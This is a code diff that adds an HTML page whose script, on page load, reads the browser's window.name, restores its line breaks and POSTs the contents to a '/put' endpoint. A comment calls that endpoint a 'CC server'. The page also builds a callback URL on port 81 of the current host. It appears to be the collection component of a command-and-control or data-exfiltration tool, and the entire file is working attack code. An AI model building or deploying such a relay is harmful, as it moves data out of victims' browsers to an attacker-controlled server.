@@ -1,0 +1,70 @@
+<html>
+<head>
+    <script type="text/javascript">
+        String.prototype.endsWith = function (suffix) {
+            return this.indexOf(suffix, this.length - suffix.length) !== -1;
+        };
+
+        String.prototype.unescapeBreaks = function () {
+            return this.replace(/{{RN}}/g, "\r\n").replace(/{{N}}/g, "\n");
+        };
+
+        // credits to Douglas Crockford's Remedial JavaScript (http://javascript.crockford.com/remedial.html) for this function
+        String.prototype.supplant = function (o) {
+            return this.replace(/{([^{}]*)}/g,
+                    function (a, b) {
+                        var r = o[b];
+                        return typeof r === 'string' || typeof r === 'number' ? r : a;
+                    }
+            );
+        };
+
+        var callbackPort = '81';
+        var callbackDomain = window.location.hostname;
+        if (callbackDomain.endsWith('/')) {
+            callbackDomain = callbackDomain.slice(0, -1);
+        }
+        var callbackUrl = '{proto}//{cbDomain}:{cbPort}'.supplant({proto: window.location.protocol, cbDomain: callbackDomain, cbPort: callbackPort});
+
+        // Sends a data back to CC server
+        function send(url, postData) {
+            var requestMethod;
+            if (!postData) {
+                postData = null;
+                requestMethod = 'GET';
+            } else {
+                requestMethod = 'POST';
+            }
+
+            var requestObject ;
+            try {
+                requestObject = new XMLHttpRequest();
+            } catch (err) {
+                console.log(err);
+                return;
+            }
+
+            try {
+                requestObject.open(requestMethod, url, false);
+                requestObject.send(postData);
+            } catch (err) {
+                console.log(err.message);
+            }
+        }
+
+        // Basically does what it's name suggests
+        function run() {
+            var url = '/put';
+
+            if (window.name.length > 0) {
+                send(url, window.name.unescapeBreaks());
+            }
+        }
+
+    </script>
+</head>
+
+<body onload="run()">
+</body>
+
+</html>
